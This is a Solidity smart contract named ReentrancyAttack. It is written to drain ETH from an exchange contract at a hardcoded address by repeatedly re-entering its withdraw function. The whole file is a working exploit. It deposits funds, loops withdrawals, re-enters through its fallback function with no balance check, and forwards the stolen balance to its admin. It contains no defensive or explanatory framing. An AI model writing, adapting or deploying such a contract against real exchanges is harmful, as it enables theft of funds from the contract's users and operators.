pragma solidity ^0.4.16;

interface Exchange {
    function deposit() external payable;
    function withdraw(address token, uint256 amount) external returns (bool success);
}

contract ReentrancyAttack {
    Exchange public exchange;
    address public admin;
    uint256 public count;

    // Constructor using the contract name (for Solidity versions <0.4.22)
    function ReentrancyAttack() public {
        exchange = Exchange(0x2a0c0DBEcC7E4D658f48E01e3fA353F44050c208);
        admin = msg.sender;
    }

    // Modifier to allow only the admin to execute certain functions
    modifier onlyAdmin() {
        require(msg.sender == admin);
        _;
    }

    // Function to deposit ETH into this contract
    function depositETH() external payable onlyAdmin {
        require(msg.value > 0);
    }

    // Function to deposit ETH into the Exchange contract (admin only)
    function deposit() external payable onlyAdmin {
        require(msg.value > 0);
        exchange.deposit.value(msg.value)();
    }

    // Function to initiate the reentrancy attack with adjustable amount (admin only)
    function attack(uint256 amount, uint256 times) external onlyAdmin {
        require(amount > 0 && amount <= address(this).balance);
        for (uint256 i = 0; i < times; i++) {
            exchange.withdraw(0x0000000000000000000000000000000000000000, amount);
        }
    }

    // Fallback function to reenter withdrawal, no balance check
    function () external payable {
        count++;
        exchange.withdraw(0x0000000000000000000000000000000000000000, address(this).balance); // Reenter withdrawal without checking balance
    }

    // Function to collect all funds in the contract (admin only)
    function collectFunds() external onlyAdmin {
        require(address(this).balance > 0);
        admin.transfer(address(this).balance);
    }
}